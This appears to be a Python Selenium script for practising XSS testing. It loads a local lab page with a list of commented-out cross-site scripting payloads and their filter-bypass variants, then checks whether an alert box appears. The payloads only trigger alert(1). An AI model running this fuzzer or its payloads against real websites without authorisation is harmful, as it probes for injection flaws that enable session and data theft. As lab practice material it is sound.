from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time

my_xss_payload = [
	# "<img src=x onerror=alert(1)>",
	# "<img src=x onerror=alert(1)",
	# "<img/src=x/onerror=alert(1)>",
	# "<script><script>alert(1)</script>",
	# "<scr<object>ipt>alert(1)</script>",
	# "<scr<object>ipt>alert(1)</scr<object>ipt>",
	# "<svg onload=alert(1)>",
	# "<svg/onload=alert(1)>",
	# "<svg onload=alert(1)",
	# "<marquee onstart=alert(1)></marquee>",
	# "<marquee onstart=alert(1)",
	# "<marquee onstart=alert(1)>",
	# "<noscript><p title='</noscript><svg onload=alert(1)>'>",
	# "<noscript><a title='</noscript><body onload=alert(1)>'>",	
	# "<frameset onload=alert(1)>",
	# "<iframe onload=alert(1)></iframe>",
	# "<iframe src='http://localhost/penetrasi/iframe.html'></iframe>"
]

target_url = [
	"http://localhost/penetrasi/learning-xss.php?name=",
]

driver = webdriver.Firefox(executable_path="D:\\driver\\geckodriver.exe");


for index, item in enumerate(my_xss_payload):			

	for index_target_url, item_target_url in enumerate(target_url):
		driver.get(item_target_url + item)

		try:
			alert = WebDriverWait(driver,5).until(EC.alert_is_present())
			alert.accept()
			print("Alert Apper with : " + item)
		except TimeoutException:
			print("Alert does apper")

		time.sleep(10)

	time.sleep(5)

time.sleep(5);
driver.quit();

print("DONE")